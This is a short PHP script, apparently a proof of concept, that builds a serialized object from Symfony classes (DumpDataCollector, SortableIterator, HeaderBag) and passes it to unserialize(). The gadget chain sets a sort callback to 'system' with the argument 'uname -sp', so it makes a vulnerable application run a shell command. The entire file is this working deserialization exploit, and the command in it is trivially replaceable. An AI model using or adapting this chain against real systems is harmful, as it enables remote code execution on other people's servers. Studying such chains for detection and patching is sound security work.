<?php

include __DIR__.'/vendor/autoload.php';

$s  = 'O:60:"Symfony\\Component\\HttpKernel\\DataCollector\\DumpDataCollector":1:{';
$s .= 's:4:"data";O:50:"Symfony\\Component\\Finder\\Iterator\\SortableIterator":2:{';
$s .= 's:60:"'.chr(0).'Symfony\\Component\\Finder\\Iterator\\SortableIterator'.chr(0).'iterator";';
$s .= 'O:42:"Symfony\\Component\\HttpFoundation\\HeaderBag":1:{s:10:"'.chr(0).'*'.chr(0).'headers";';
$s .= 'a:2:{i:0;s:9:"uname -sp";i:1;s:3:"abc";}}';
$s .= 's:56:"'.chr(0).'Symfony\\Component\\Finder\\Iterator\\SortableIterator'.chr(0).'sort";';
$s .= 's:6:"system";}}';

unserialize($s);

?>
